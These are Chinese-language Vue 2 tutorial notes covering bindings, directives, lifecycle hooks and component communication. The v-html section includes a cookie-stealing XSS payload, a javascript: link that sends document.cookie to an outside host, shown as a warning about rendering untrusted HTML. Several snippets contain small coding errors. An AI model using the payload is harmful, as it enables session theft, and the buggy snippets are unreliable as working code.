# Vue

## Hello Vue

创建Vue实例，通过el属性绑定容器，容器与实例一一对应

文本通过插值表达式{{}}和data属性绑定

属性通过指令绑定

```
注意区分：js表达式 和 js代码(语句)
     1.表达式：一个表达式会产生一个值，可以放在任何一个需要值的地方：
           (1). a
           (2). a+b
           (3). demo(1)
           (4). x === y ? 'a' : 'b'
     2.js代码(语句)
           (1). if(){}
           (2). for(){}
```

```js
//创建Vue实例
new Vue({
	el:'#demo', //el用于指定当前Vue实例为哪个容器服务，值通常为css选择器字符串。
	data:{ //data中用于存储数据，数据供el所指定的容器去使用，值我们暂时先写成一个对象。
		name:'atguigu',
		address:'北京'
	}
})
```

## 绑定

### MVVM模型

- M：模型(Model) ：data中的数据
- V：视图(View) ：模板代码
- VM：视图模型(ViewModel)：Vue实例

### el

绑定容器

```js
// 方式一
new Vue({
	el:'#demo'
})
// 方式二
const vm = new Vue()
vm.$mount('#demo')
```

### data

```js
// 方式一：对象式
new Vue({
	el:'#demo',
	data:{
		name:'atguigu',
		address:'北京'
	}
})
// 方式二：函数式
new Vue({
	el:'#demo',
	data(){
        return {
            name:'atguigu',
			address:'北京'
        }
	}
})
```

### computed

**计算属性**

如下例子中：

当读取fullName时，或依赖的属性变化时，get就会被调用，且返回值就作为fullName的值

当fullName发生修改时，set就会被调用

```js
new Vue({
    el:'div',
    data(){
        return {
            firstName:'li',
            lastName:'yaya'
        }
    },
    computed:{
        fullName:{
            get(){
                return this.firstName + ' ' + lastName
            },
            set(value){
                const arr = value.split(' ')
                this.firstName = arr[0]
                this.lastName = arr[1]
            }
        }
    }   
})
```

```js
// 只读不写可简写
computed:{
    fullName(){
        return this.firstName + ' ' + lastName
    }
}   
```

### watch

**监视属性**

当被监视的属性变化时, 回调函数自动调用, 进行相关操作；监视的属性必须存在，才能进行监视！！

Vue中的watch默认不监测对象内部值的改变（一层）；配置deep:true可以监测对象内部值改变（多层）。

computed能完成的功能，watch都可以完成；watch能完成的功能，computed不一定能完成，例如：watch可以进行异步操作。

所被Vue管理的函数，最好写成普通函数，这样this的指向才是vm 或 组件实例对象；所有不被Vue所管理的函数（定时器的回调函数、ajax的回调函数等、Promise的回调函数），最好写成箭头函数，这样this的指向才是vm 或 组件实例对象。

```js
new Vue({
    el:'div',
    data(){
        return {
            isHot:true
            info:''
        }
    },
    methods: {
		changeWeather(){
			this.isHot = !this.isHot
		}
	},
    watch:{
        isHot:{
            immediate:true,		// 初始化时就调用一次handler
            deep:true,			// 深度监视，对象中的对象也可以监视到
            handler(newV,oldV){
        		this.info = newValue? '炎热':'凉爽'
    		}
        }
    }
})

// 方式二
vm.$watch('isHot',{
    immediate:true,
    handler(newV,oldV){
    	this.info = newValue? '炎热':'凉爽'
    }
})

// 简写（只有handler方式时可简写）
watch:{
    isHot(n,o){
        console.log('isHot被修改了',newValue,oldValue,this)
    }
}

vm.$watch('isHot',(n,o)=>{
    console.log('isHot被修改了',newValue,oldValue,this)
})
```

### filters

方便演示，这里引入dayjs包

```vue
<h3> {{time | timeFormater}} </h3>
<h3> {{time | timeFormater(YYYY_MM_DD)}} </h3>
<h3> {{time | timeFormater | timeSlice}} </h3>
<script>
	new Vue({
        el:'h3',
        data:{
            time:192911718717198,
        },
        filters:{
            timeFormater(val,str='YYYY-MM-DD HH:mm:ss'){
                return dayjs(val).format(str)
            },
            timeSlice(val){
                return val.slice(0,4)
            }
        }
    })
</script>
```

```js
// 全局过滤器
Vue.filter('timeSlice',val=>val.slice(0,4))
```

还可以和v-bind搭配，不能和v-model一起使用

### 绑定样式

```vue
<div id="root">
	<!-- 绑定class样式--字符串写法，适用于：样式的类名不确定，需要动态指定 -->
	<div class="basic" :class="mood" @click="changeMood">{{name}}</div> <br/><br/>

	<!-- 绑定class样式--数组写法，适用于：要绑定的样式个数不确定、名字也不确定 -->
	<div class="basic" :class="classArr">{{name}}</div> <br/><br/>

	<!-- 绑定class样式--对象写法，适用于：要绑定的样式个数确定、名字也确定，但要动态决定用不用 -->
	<div class="basic" :class="classObj">{{name}}</div> <br/><br/>

	<!-- 绑定style样式--对象写法 -->
	<div class="basic" :style="styleObj">{{name}}</div> <br/><br/>
	<!-- 绑定style样式--数组写法 -->
	<div class="basic" :style="styleArr">{{name}}</div>
</div>
```



```js
new Vue({
    el:'div',
    data(){
    	return {
            name:'li',
            // 绑定class
            mood:'normal',
            classArr:['class1','class2','class3'],
            classObj:{
                class1:false,
                class2:false,
            },
            // 绑定style
            styleObj:{},
            styleObj2:{},
            styleArr:[
                {},{}
            ]
        }
	},
    methods:{
        changeMood(){
            const arr = ['happy','sad','normal']
            const index = Math.floor(Math.random()*3)
            this.mood = arr[index]
        }
    }
})
```



## 原理

### Object.defineProperty()

用来给对象定义属性

第一个参数是对象，第二个参数是属性，第三个参数是配置对象

配置对象

- value：属性值
- enumerable：默认false，属性私有不展示
- writable：默认false，属性不可被修改
- configurable：默认false，属性不可被删除
- get()方法：读取该属性时调用get方法，返回值就是属性值
- set()方法：修改该属性时调用set方法，入参为修改后的值

```js
let number = 18
let person = {
	name:'张三',
	sex:'男',
}

Object.defineProperty(person,'age',{
	// value:18,
	// enumerable:true, //控制属性是否可以枚举，默认值是false
	// writable:true, //控制属性是否可以被修改，默认值是false
	// configurable:true //控制属性是否可以被删除，默认值是false

	//当有人读取person的age属性时，get函数(getter)就会被调用，且返回值就是age的值
	get(){
		console.log('有人读取age属性了')
		return number
	},
	//当有人修改person的age属性时，set函数(setter)就会被调用，且会收到修改的具体值
	set(value){
		console.log('有人修改了age属性，且值是',value)
		number = value
	}
})
```

### 数据代理

通过一个代理对象对另一个对象中的属性进行操作（读或写）

```js
const obj1 = {y:100}	// 代理对象
const obj2 = {x:200}	// 被操作的对象

Object.defineProperty(obj1,'x',{	// 通过代理对象obj1
    get(){
        return obj2.x				// 操作obj2
    }
    set(value){
    	obj2.x = value				// 操作obj2
	}
})
```

Vue中，通过实例vm代理data对象中属性的操作，从而能更方便的操作data中的数据

- 通过Object.defineProperty()把data对象中的所有属性添加到vm上
- 为每个添加到vm的属性指定getter、setter
- 在getter、setter内部操作data属性

### 数据劫持

先看一个问题

```js
new Vue({
	el:'#root',
	data:{
		persons:[
			{id:'001',name:'马冬梅',age:30,sex:'女'},
			{id:'002',name:'周冬雨',age:31,sex:'女'},
			{id:'003',name:'周杰伦',age:18,sex:'男'},
			{id:'004',name:'温兆伦',age:19,sex:'男'}
		]
	},
	methods: {
		updateMei(){
			this.persons[0].name = '马老师' // 可监测到
			this.persons[0].age = 50 		// 可监测到
			this.persons[0].sex = '男' 		// 可监测到
			this.persons[0] = {id:'001',name:'马老师',age:50,sex:'男'} // 监测不到
		}
	}
}) 
```

发现一个现象，更改对象的属性可以监测到变化，直接用新的对象替换却监测不到，所以需要了解Vue怎么监测数据变化的

首先，看看Vue怎么监测对象的变化

```js
const data = {		// 待检测的对象
	name:'li',
    address:'bj',
}

// 对data进行监测
const obs = Observer(data)
// 放到vm对象（代理对象）中，此时还有getter、setter方法，不使用代理的话读取数据时会发生无限递归
const vm = {}
vm._data = data = obs

// 封装的监测方法
function Observer(obj){
    // 拿到对象所有的属性
    const keys = Object.keys(obj)
    // 遍历
    keys.forEach(k=>{
        Object.defineProperty(this,k,{
            get(){
                return obj[k]
            },
            set(val){
                obj[k] = val
            }
        })
    })
}
```

由此可以看出，Vue通过getter、setter实现数据劫持，对数据变化进行监测

这里插一句，当我们想动态添加一个属性时，要想交给Vue管理，必须有对应的getter、setter，这里有两个方法

- 动态添加属性 --- Vue.set()、vm.$set()

- 局限性：不能对vm直接添加属性，或者说只能为属性中的对象添加属性

```js
new Vue({
    el:'div',
    data(){
        return {
            name:'school',
            address:'bj',
            student:{
                name:'li',
                age:18,
            }
        }
    },
    methods:{
        addSex(){
            this.$set(this.student,'sex','man')
            // Vue.set(this.student,'sex','男')
        }
    }
})
```

接着，谈谈Vue怎么监测数组的变化

当我们修改时，修改的一般是数组元素，但是我们发现，数组中的元素索引并没有对应的getter、setter，所以通过索引对数组进行修改时，Vue是监测不到的；

所以，回到开始的案例中，当直接修改数组中对象的属性时，有getter、setter，可被监测到；当修改数组某个索引的指向时，就监测不到了

事实上，Vue是对数组的7大方法进行了监测【push()、pop()、shift()、unshift()、splice()、sort()、reverse()】，这个我们验证下`vm.persons.push === Array.prototype.push`发现结果为false，是因为Vue把数组的这7个方法进行了重写，在重写中实现了监测逻辑；

还有一种方法，用的比较少，就是使用Vue.set()

```js
new Vue({
	...
	methods: {
		updateMei(){
			this.persons.splice(0,1,{id:'001',name:'马老师',age:50,sex:'男'})	// 可监测到
			this.$set(this.persons,0,{id:'001',name:'马老师',age:50,sex:'男'})	// 可监测到
		}
	}
}) 
```



## 指令

### v-bind

单向绑定，简写**：**

```vue
<a :href="url">点我去{{school.name}}学习2</a>
<input type="text" :value="name"><br/>
```

### v-model

双向绑定，**只能用于表单元素**，故绑定value简写v-model

```vue
<input type="text" v-model:value="name"><br/>
<input type="text" v-model="name"><br/>			<!-- 简写 -->
```

**修饰符**

```vue
<input type="text" v-model.number="age"><br/>	<!-- 转为number -->
<input type="text" v-model.trim="name"><br/>	<!-- 去掉前后空格 -->
<input type="text" v-model.lazy="name"><br/>	<!-- 失去焦点时更新Vue的数据 -->
```

### v-on

绑定事件，和methods配合，简写@

```vue
<div>
    <h2>你好，{{name}}</h2>
	<button @click='showInfo'>点我点我</button>
    <button @click="showInfo2($event,111)">再点再点</button>
</div>

<script>
    new Vue({
        el:'.root',
        data(){
            return {
                name: 'li'
            }
        },
        methods:{
			showInfo(e){		// 没有传参时，默认一个参数为e
                console.log(e.target.innerText)
                console.log(this) //此处的this是vm
            },
            showInfo2(e,num){
                console.log(e.target.innerText)
                console.log(this) //此处的this是vm
                console.log(num)
            }
        }
    })
</script>
```

**事件修饰符**

​    1.prevent：阻止默认事件（常用）；

​    2.stop：阻止事件冒泡（常用）；

​    3.once：事件只触发一次（常用）；

​    4.capture：使用事件的捕获模式；

​    5.self：只有event.target是当前操作的元素时才触发事件；

​    6.passive：事件的默认行为立即执行，无需等待事件回调执行完毕（一些回调逻辑复杂，等执行完会很卡顿）；

```vue
<!-- 阻止默认事件（常用） -->
<a href="http://www.baidu.com" @click.prevent="showInfo">点我提示信息</a>

<!-- 阻止事件冒泡（常用） 加在内部容器上-->
<div class="demo1" @click="showInfo">
	<button @click.stop="showInfo">点我提示信息</button>
	<!-- 修饰符可以连续写 -->
	<!-- <a href="http://www.atguigu.com" @click.prevent.stop="showInfo">点我提示信息</a> -->
</div>

<!-- 事件只触发一次（常用） -->
<button @click.once="showInfo">点我提示信息</button>

<!-- 使用事件的捕获模式 加在外部容器上-->
<div class="box1" @click.capture="showMsg(1)">
	div1
	<div class="box2" @click="showMsg(2)">
		div2
	</div>
</div>

<!-- 只有event.target是当前操作的元素时才触发事件； -->
<div class="demo1" @click.self="showInfo">
	<button @click="showInfo">点我提示信息</button>
</div>

<!-- 事件的默认行为立即执行，无需等待事件回调执行完毕； -->
<ul @wheel.passive="demo" class="list">
	<li>1</li>
	<li>2</li>
	<li>3</li>
	<li>4</li>
</ul>
```

**键盘事件**

```
1.Vue中常用的按键别名：
	回车 => enter
	删除 => delete (捕获“删除”和“退格”键)
	退出 => esc
	空格 => space
	换行 => tab (特殊，必须配合keydown去使用)
	上 => up
	下 => down
	左 => left
	右 => right
2.Vue未提供别名的按键，可以使用按键原始的key值去绑定，但注意要转为kebab-case（短横线命名）
3.系统修饰键（用法特殊）：ctrl、alt、shift、meta
			(1).配合keyup使用：按下修饰键的同时，再按下其他键，随后释放其他键，事件才被触发。
			(2).配合keydown使用：正常触发事件。
4.也可以使用keyCode去指定具体的按键（不推荐）
5.Vue.config.keyCodes.自定义键名 = 键码，可以去定制按键别名
```

```vue
<div id="root">
	<h2>欢迎来到{{name}}学习</h2>
    <!-- <input type="text" placeholder="按下回车提示输入" @keydown.enter="showInfo"> -->
	<input type="text" placeholder="按下回车提示输入" @keydown.huiche="showInfo">
</div>
<script>
	new Vue({
        el:'#root',
        data(){
            return {
                name:'li'
            }
        },
        methods:{
            showInfo(e){
                console.log(e.target.value)
            }
        }
    })
</script>
```

### v-for

**列表渲染**

```
v-for指令:
		1.用于展示列表数据
		2.语法：v-for="(item, index) in xxx" :key="yyy" ---- of或in都可以
		3.可遍历：数组、对象、字符串（用的很少）、指定次数（用的很少）
```

```vue
<!-- 遍历数组 -->
<ul>
	<li v-for="(p,index) of persons" :key="index">
		{{p.name}}-{{p.age}}
	</li>
</ul>

<!-- 遍历对象 -->
<ul>
	<li v-for="(value,k) of car" :key="k">
		{{k}}-{{value}}
	</li>
</ul>
```

```
面试题：react、vue中的key有什么作用？（key的内部原理）

1. 虚拟DOM中key的作用：
				key是虚拟DOM对象的标识，当数据发生变化时，Vue会根据【新数据】生成【新的虚拟DOM】, 
				随后Vue进行【新虚拟DOM】与【旧虚拟DOM】的差异比较，比较规则如下：			
2.对比规则：
			(1).旧虚拟DOM中找到了与新虚拟DOM相同的key：
						①.若虚拟DOM中内容没变, 直接使用之前的真实DOM！
						②.若虚拟DOM中内容变了, 则生成新的真实DOM，随后替换掉页面中之前的真实DOM。
			(2).旧虚拟DOM中未找到与新虚拟DOM相同的key
						创建新的真实DOM，随后渲染到到页面。					
3. 用index作为key可能会引发的问题：
					1. 若对数据进行：逆序添加、逆序删除等破坏顺序操作:
									会产生没有必要的真实DOM更新 ==> 界面效果没问题, 但效率低。
					2. 如果结构中还包含输入类的DOM：
									会产生错误DOM更新 ==> 界面有问题。
4. 开发中如何选择key?:
					1.最好使用每条数据的唯一标识作为key, 比如id、手机号、身份证号、学号等唯一值。
					2.如果不存在对数据的逆序添加、逆序删除等破坏顺序操作，仅用于渲染列表用于展示，
						使用index作为key是没有问题的。
```

**过滤**

```js
new Vue({
    el:'div',
    data(){
        return {
            keyword:'',
            persons:[
                {id:1,name:'lun',age:19,sex:'woman'},
                {id:2,name:'ren',age:18,sex:'man'},
                {id:3,name:'li',age:29,sex:'man'},
                {id:4,name:'gun',age:14,sex:'woman'},
            ]
        }
    },
    computed:{
        filPerson(){
            return this.persons.filter(p=>p.name.indexOf(this.keyword) !== -1)
        }
    }
})
```

**排序**

```js
new Vue({
    el:'div',
    data(){
        return {
            keyword:'',
            sortType:0,
            persons:[
                {id:1,name:'lun',age:19,sex:'woman'},
                {id:2,name:'ren',age:18,sex:'man'},
                {id:3,name:'li',age:29,sex:'man'},
                {id:4,name:'gun',age:14,sex:'woman'},
            ]
        }
    },
    computed:{
        filPerson(){
            const arr = this.persons.filter(p=>p.name.indexOf(this.keyword) !== -1)
            if(this.sortType!==0)
                arr = arr.sort((p1,p2)=>this.sortType === 1 ? p2.age-p1.age : p1.age-p2.age)
            return arr
        }
    }
})
```

### v-if、v-show

**条件渲染**

```
1.v-if
			写法：
					(1).v-if="表达式" 
					(2).v-else-if="表达式"
					(3).v-else="表达式"
			适用于：切换频率较低的场景。
			特点：不展示的DOM元素直接被移除。
			注意：v-if可以和:v-else-if、v-else一起使用，但要求结构不能被“打断”。

2.v-show
			写法：v-show="表达式"
			适用于：切换频率较高的场景。
			特点：不展示的DOM元素未被移除，仅仅是使用样式隐藏掉
	
3.备注：使用v-if的时，元素可能无法获取到，而使用v-show一定可以获取到。
```

```vue
<!-- v-if与template的配合使用 -->
<template v-if="n === 1">
	<h2>你好</h2>
	<h2>尚硅谷</h2>
	<h2>北京</h2>
</template>
```

### v-text、v-html

```vue
<div>你好，{{name}}</div>			<!-- 你好，li -->
<div v-text="name">你好，</div>	<!-- li -->

...
name='li'
```

```vue
<div>{{str}}</div>				<!-- <h3> 你好啊！</h3> -->
<div v-html="str">你好，</div>		<!-- 你好啊！ -->
<div v-html="str2"></div>		<!-- 跳转了，并带着cookie -->
...
str='<h3> 你好啊！</h3>'
<!-- 安全风险 -->
str2:'<a href=javascript:location.href="http://www.baidu.com?"+document.cookie>兄弟我找到你想要的资源了，快来！</a>',
```

```
v-html指令：
	1.作用：向指定节点中渲染包含html结构的内容。
	2.与插值语法的区别：
				(1).v-html会替换掉节点中所有的内容，{{xx}}则不会。
				(2).v-html可以识别html结构。
	3.严重注意：v-html有安全性问题！！！！
				(1).在网站上动态渲染任意HTML是非常危险的，容易导致XSS攻击。
				(2).一定要在可信的内容上使用v-html，永不要用在用户提交的内容上！
```

### v-cloak

```
v-cloak指令（没有值）：
	1.本质是一个特殊属性，Vue实例创建完毕并接管容器后，会删掉v-cloak属性。
	2.使用css配合v-cloak可以解决网速慢时页面展示出{{xxx}}的问题。
```

```vue
<style>
	[v-cloak]{
		display:none;
	}
</style>
<div id="root">
	<h2 v-cloak>{{name}}</h2>
</div>
<script type="text/javascript" src="http://localhost:8080/resource/5s/vue.js"></script>
...
```

### v-once

```
v-once指令：
	1.v-once所在节点在初次动态渲染后，就视为静态内容了。
	2.以后数据的改变不会引起v-once所在结构的更新，可以用于优化性能。
```

```vue
<div id="root">
	<h2 v-once>初始化的n值是:{{n}}</h2>
	<h2>当前的n值是:{{n}}</h2>
	<button @click="n++">点我n+1</button>
</div>
```

### v-pre

```
v-pre指令：
	1.跳过其所在节点的编译过程。
	2.可利用它跳过：没有使用指令语法、没有使用插值语法的节点，会加快编译。
```

```vue
<div id="root">
	<h2 v-pre>Vue其实很简单</h2>
	<h2 >当前的n值是:{{n}}</h2>
	<button @click="n++">点我n+1</button>
</div>
```

### 自定义

```js
<h2>当前的n值是：<span v-text="n"></span> </h2>
<h2>放大10倍后的n值是：<span v-big="n"></span> </h2>
    
new Vue({
    el:'div',
    data:{
        num:1
    },
    directives:{
        // 方式一：函数
        big(element,binding){
            element.innerText = binding.value * 10
        }
    }
})
```

```js
<input type="text" v-fbind:value="n">	<!-- 实现：一上来就能获得焦点-->

new Vue({
    el:'div',
    data:{
        num:1
    },
    directives:{
        // 方式二：对象
        fbind:{
            // 指令与元素成功绑定时（一上来）
            bind(){
                element.value = binding.value
            },
            // 指令所在元素被插入页面时
            inserted(){
                element.focus()
            },
            // 指令所在的模板被重新解析时
            update(){
                element.value = binding.value
            }
        }
    }
})
```

```js
// 全局
Vue.directive('fbind',{
	//指令与元素成功绑定时（一上来）
	bind(element,binding){
		element.value = binding.value
	},
	//指令所在元素被插入页面时
	inserted(element,binding){
		element.focus()
	},
	//指令所在的模板被重新解析时
	update(element,binding){
		element.value = binding.value
	}
})
```

## 生命周期

beforeCreate：数据代理还未开始，拿不到_data\data数据、methods中的方法

created：完成了数据代理、数据劫持

beforeMount：刚生成虚拟DOM，还没放到页面上，在这操作DOM最终都不会生效

mounted：Vue完成模板的解析并把初始的真实DOM元素放入页面后（挂载完毕）调用mounted

​	常用来进行【初始化操作】：发送ajax请求、启动定时器、绑定自定义事件、订阅消息等

beforeUpdate：数据已更新，但是页面还是旧的

updated：页面和数据进行同步

beforeDestroy：销毁前的处理，数据都还在

​	常用来进行【收尾工作】：清除定时器、解绑自定义事件、取消订阅消息等

destroyed：挂了

```js
<h2 :style="{opacity}">欢迎学习Vue</h2>

new Vue({
    el:'div',
    data:{
        opcaity:1
    },
    mounted(){
        this.timer = setInterval(()=>{
            this.opacity -= 0.01
            if(this.opacity <= 0) this.opacity = 1
        })
    },
    beforeDestroy(){
        clearInterval(this.timer)
    }
})
```

## 组件

### 非单文件组件

没有el属性，组件就是一块砖，哪里需要哪里搬，不能在这里指定

data写成函数式

组件名多单词时，`my-school`、`MySchool (需要Vue脚手架支持)`

```js
// 声明
const school = Vue.extend({
    template:`
			<div class="demo">
				<h2>学校名称：{{schoolName}}</h2>
				<h2>学校地址：{{address}}</h2>
				<button @click="showName">点我提示学校名</button>	
			</div>
		`,
    data(){
        return {
            name:'huacaoyuan',
            address:'bj',
        }
    }
})
...
// 注册
new Vue({
    el:'div',
    components:{
        school
        ...
    }
})
// 全局注册
Vue.components('school',school)

// 使用
<div id="root">
	<school></school>
</div>
```

### 嵌套

```vue
<body>
	<!-- 准备好一个容器-->
	<div id="root"></div>
</body>

<script type="text/javascript">
	//定义student组件
	const student = Vue.extend({
		name:'student',
		template:`
			<div>
				<h2>学生姓名：{{name}}</h2>	
				<h2>学生年龄：{{age}}</h2>	
			</div>
		`,
		data(){
			return {
				name:'尚硅谷',
				age:18
			}
		}
	})
	
	//定义school组件
	const school = Vue.extend({
		name:'school',
		template:`
			<div>
				<h2>学校名称：{{name}}</h2>	
				<h2>学校地址：{{address}}</h2>	
				<student></student>
			</div>
		`,
		data(){
			return {
				name:'尚硅谷',
				address:'北京'
			}
		},
		//注册组件（局部）
		components:{
			student
		}
	})

	//定义hello组件
	const hello = Vue.extend({
		template:`<h1>{{msg}}</h1>`,
		data(){
			return {
				msg:'欢迎来到尚硅谷学习！'
			}
		}
	})
	
	//定义app组件
	const app = Vue.extend({
		template:`
			<div>	
				<hello></hello>
				<school></school>
			</div>
		`,
		components:{
			school,
			hello
		}
	})

	//创建vm
	new Vue({
		template:'<app></app>',
		el:'#root',
		//注册组件（局部）
		components:{app}
	})
</script>
```

### VueComponent

组件本质是一个名为VueComponent的构造函数，且不是程序员定义的，是Vue.extend生成的

我们只需要写`<school/>`或`<school></school>`，Vue解析时会帮我们创建school组件的实例对象，

​              即Vue帮我们执行的：new VueComponent(options)

每次调用Vue.extend，返回的都是一个全新的VueComponent！！！！

关于this

- 组件配置中：data函数、methods中的函数、watch中的函数、computed中的函数 它们的this均是【VueComponent实例对象】
- new Vue(options)配置中：data函数、methods中的函数、watch中的函数、computed中的函数 它们的this均是【Vue实例对象】

原型关系：`VueComponent.prototype.__proto__ === Vue.prototype`，让组件实例对象（vc）可以访问到 Vue原型上的属性、方法

### 单文件组件

school.vue ---- 组件

```vue
<template>
	<!-- 组件结构 -->
	<div class="demo">
		<h2>学校名称：{{name}}</h2>
		<h2>学校地址：{{address}}</h2>
		<button @click="showName">点我提示学校名</button>	
	</div>
</template>

<script>
	// 组件交互
    // 暴露
    export default {	// 省略了Vue.extend()
        name:'School',
        data(){
			return {
				name:'尚硅谷',
				address:'北京昌平'
			}
		},
		methods: {
			showName(){
				alert(this.name)
			}
		}, 
    }
</script>

<style>
	/* 组件样式 */
    .demo{
		background-color: orange;
	}
</style>
```

app.vue ---- 用于汇总，一人之下万人之上

```vue
<template>
	<div>
		<School></School>
		<Student></Student>
	</div>
</template>

<script>
	//引入组件
	import School from './School.vue'
	import Student from './Student.vue'

	export default {
		name:'App',
		components:{
			School,
			Student
		}
	}
</script>
```

main.js/app.js --- 大哥vm

```js
import App from './App.vue'

new Vue({
	el:'#root',
	template:`<App></App>`,
	components:{App},
})
```

index.html ---- 容器

```html
<body>
	<!-- 准备一个容器 -->
	<div id="root"></div>
	<script type="text/javascript" src="../js/vue.js"></script>
	<script type="text/javascript" src="./main.js"></script>
</body>
```

## CLI

镜像	`npm config set registry https://registry.npm.taobao.org`

安装	`npm i -g @vue/cli`

创建	`vue create xxxx`

启动	`npm run serve`

```
目录结构
	- babel.config.js	babel的配置文件，用于es6->es5
	- package.json		项目配置 - 打包，运行等
	- package-lock.json	包版本控制
	- src
		- main.js		大哥vm，引入vue，项目的入口
		- App.vue		一人之下的组件汇总
		- assets		存放静态资源
		- components	存放组件
	- public			存放页面
		- index.html	
		- favicon.ioc
```

### main.js

vue.js是完整的Vue，包含核心功能和模板解析器

vue.runtime.xxx.js是运行版的Vue，只包含核心功能，没有模板解析器

CLI默认引用的是vue.runtime.esm.js 阉割版的vue，缺少模板解析器，故不能使用vue中的template属性，需要用render函数接收到的createElement函数指定具体内容

```js
import Vue from 'vue'		// 这里引入的 vue.runtime.esm.js
import App from './App.vue'

Vue.config.productionTip = false

new Vue({
  render: h => h(App),
  // 完整写法
  render: render(createElement){
     return createElement('h1','你好！')
  }
}).$mount('#app')
```

### ref属性

1. 被用来给元素或子组件注册引用信息（id的替代者）
   - 应用在**html标签**上获取的是**真实DOM元素**
   - 应用在**组件标签**上是**组件实例对象（vc）**
2. 使用方式：
   1. 打标识：`<h1 ref="xxx">.....</h1>` 或 `<School ref="xxx"></School>`
   2. 获取：`this.$refs.xxx`

```vue
<template>
	<div>
		<h1 v-text="msg" ref="title"></h1>
		<button ref="btn" @click="showDOM">点我输出上方的DOM元素</button>
		<School ref="sch"/>
	</div>
</template>

<script>
	//引入School组件
	import School from './components/School'

	export default {
		name:'App',
		components:{School},
		data() {
			return {
				msg:'欢迎学习Vue！'
			}
		},
		methods: {
			showDOM(){
				console.log(this.$refs.title) //真实DOM元素
				console.log(this.$refs.btn) //真实DOM元素
				console.log(this.$refs.sch) //School组件的实例对象（vc）
			}
		},
	}
</script>
```

### props配置

- 功能：让组件接收外部传过来的数据 ---- 多用于**父 -> 子的通信**

- 传递数据：`<Demo name="xxx"/>`
  - 没有冒号那值就是一个字符串，接收后使用的时候可能需要类型转换
  - 有冒号就是v-bind数据绑定，是一个表达式，无需进行类型转换

```vue
<Student name="李四" sex="女" :age="18"/>
```

- 接收数据：
  - 第一种方式（只接收）：`props:['name']`
  - 第二种方式（限制类型）：`props:{name:String}`
  - 第三种方式（限制类型、限制必要性、指定默认值）：

```js
props:{
	name:{
        type:String, //类型
        required:true, //必要性
        default:'老王' //默认值
	}
}
```

> 备注：**props是只读的**，Vue底层会监测你对props的修改，如果进行了修改，就会发出警告，若业务需求确实需要修改，那么请复制props的内容到data中一份，然后去修改data中的数据，也就是说**不建议使用v-model直接操作props中的数据**

子->父

- 父传一个方法给子

```vue
<School :getSchoolName="getSchoolName"/>

methods: {
	getSchoolName(name){
		console.log('App收到了学校名：',name)
	}
}
```

- 子用props接收这个方法，并通过调用来传递数据

```vue
props:['getSchoolName'],
methods: {
	sendSchoolName(){
		this.getSchoolName(this.name)
	}
}
```

### mixins混合

功能：可以把多个组件共用的配置提取成一个混入对象

冲突时，data、methods就近原则，但生命周期的钩子函数不会覆盖

定义 mixin.js

```js
export const hunhe = {
	methods: {
		showName(){
			alert(this.name)
		}
	},
	mounted() {
		console.log('你好啊！')
	},
}
export const hunhe2 = {
	data() {
		return {
			x:100,
			y:200
		}
	},
}
```

局部使用

```vue
<script>
	import {hunhe,hunhe2} from '../mixin'

	export default {
		name:'Student',
		data() {
			return {
				name:'张三',
				sex:'男'
			}
		},
		mixins:[hunhe,hunhe2]
	}
</script>
```

全局使用

```js
import {hunhe,hunhe2} from '../mixin'
Vue.mixin(hunhe)
Vue.mixin(hunhe2)
```



### 插件

- 功能：用于增强Vue

- 本质：包含install方法的一个对象，install的第一个参数是Vue，第二个以后的参数是插件使用者传递的数据。

- 定义插件：

```js
export default {
	install(Vue,x,y,z){
		console.log(x,y,z)
		//全局过滤器
		Vue.filter('mySlice',function(value){
			return value.slice(0,4)
		})

		//定义全局指令
		Vue.directive('fbind',{
			//指令与元素成功绑定时（一上来）
			bind(element,binding){
				element.value = binding.value
			},
			//指令所在元素被插入页面时
			inserted(element,binding){
				element.focus()
			},
			//指令所在的模板被重新解析时
			update(element,binding){
				element.value = binding.value
			}
		})

		//定义混入
		Vue.mixin({
			data() {
				return {
					x:100,
					y:200
				}
			},
		})

		//给Vue原型上添加一个方法（vm和vc就都能用了）
		Vue.prototype.hello = ()=>{alert('你好啊')}
	}
}
```

- 使用插件：

```js
//引入插件
import plugins from './plugins'
//应用（使用）插件
Vue.use(plugins,1,2,3)
```

### scoped样式

- 作用：让样式在局部生效，防止冲突

- 写法：```<style scoped>```

### 组件自定义事件

- 一种组件间通信的方式，适用于：**子组件 ===> 父组件**

- 绑定自**定义**事件：
  - 第一种方式，在父组件中：`<Demo @demo="test"/>` 或 `<Demo v-on:demo="test"/>`
  - 第二种方式，在父组件中：给子组件标签上加ref属性，绑定mounted钩子函数`this.$refs.xxx.$on('demo',this.test)`

- 若想让自定义事件只能**触发一次**，可以使用`once`修饰符，或`$once`方法。

- **触发**自定义事件：`this.$emit('demo',数据)`

- **解绑**自定义事件`this.$off('demo')`

- 组件上也可以绑定原生DOM事件，需要使用`native`修饰符，也就是说，组件标签中的`@click`会当做自定义组件，`@click.native`才当做原生的点击事件处理

- 注意：通过`this.$refs.xxx.$on('demo',回调)`绑定自定义事件时，回调要么配置在methods中，要么用箭头函数，否则this指向会出问题！

```vue
<!-- 父组件绑定 -->
<Student @demo="test"/>
<Student @demo.once="test"/>
<!-- <Student v-on:demo="test"/> -->
methods: {
	test(name){
		console.log('demo事件被触发了！',name)
	}
}
<!-- 子组件触发 -->
methods: {
	chufa_test(name){
		this.$emit('demo',数据)
	}
}
```

```vue
<!-- 父组件绑定 -->
<Student ref="demo"/>

mounted(){
   this.$refs.demo.$on('test',this.test)
   this.$refs.demo.$once('test',this.test)	// 触发一次
}
methods: {
	test(name){
		console.log('demo事件被触发了！',name)
	}
}
<!-- 子组件触发 -->
methods: {
	chufa_test(name){
		this.$emit('demo',数据)
	}
}
```

### 全局事件总线

- 一种组件间通信的方式，适用于任意组件间通信

- main.js中安装全局事件总线：$bus就是当前应用的vm

- 使用事件总线：
  - 接收数据：A组件想接收数据，则在A组件中给$bus绑定自定义事件，事件的回调留在A组件自身
  - 提供数据：`this.$bus.$emit('xxxx',数据)`
  - 最好在beforeDestroy钩子中，用$off去解绑当前组件所用到的事件

```js
// main.js：安装总线
new Vue({
	......
	beforeCreate() {
		Vue.prototype.$bus = this 		//安装全局事件总线，$bus就是当前应用的vm
	},
    ......
}) 
// 组件1：发送数据
methods(){
  demo(data){
  		this.$bus.$emit('hello',this.name)
  }
}

// 组件2：接收数据
mounted() {
	this.$bus.$on('hello',(data)=>{
		console.log('我是School组件，收到了数据',data)
	})
},
beforeDestroy() {		// 销毁
	this.$bus.$off('hello')
},
```

### 消息发布订阅

- 一种组件间通信的方式，适用于任意组件间通信。

- 使用步骤：
  - 安装pubsub：`npm i pubsub-js`
